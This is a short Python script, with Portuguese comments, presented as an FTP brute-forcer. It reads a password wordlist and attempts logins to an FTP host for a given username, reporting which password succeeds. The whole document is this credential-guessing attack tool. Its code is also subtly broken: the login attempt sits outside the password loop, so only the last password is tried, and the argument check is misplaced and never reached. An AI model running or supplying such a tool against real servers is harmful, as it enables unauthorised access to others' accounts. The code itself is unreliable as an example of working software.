
# FTP Brute-Forcer

# Importando as Bibliotecas
import sys
import ftplib

# Função para conectar ao servidor FTP
def ftp_brute_forcer(host, username, password_list):
    ftp = ftplib.FTP(host)

    # Ler as senhas da wordlist e armazena em lista
    with open(password_list, 'r') as file:
        passwords = file.readlines()

        for password in passwords:
            password = password.strip()

    # Tentativa de conexão com usuário e senha do wordlist
    try:
        ftp.login(username, password)
        print(f'Successful! USR: {username}), PWD: {password}')
        ftp.quit()
        return
    except ftplib.error_perm:
        print(f'Failed login. Password: {password}')
    print('Brute force attack failed.')

    # Validação dos parâmetros de entrada
    if len(sys.argv) < 4:
        print('Uso: script.py host username password')
        sys.exit(1)
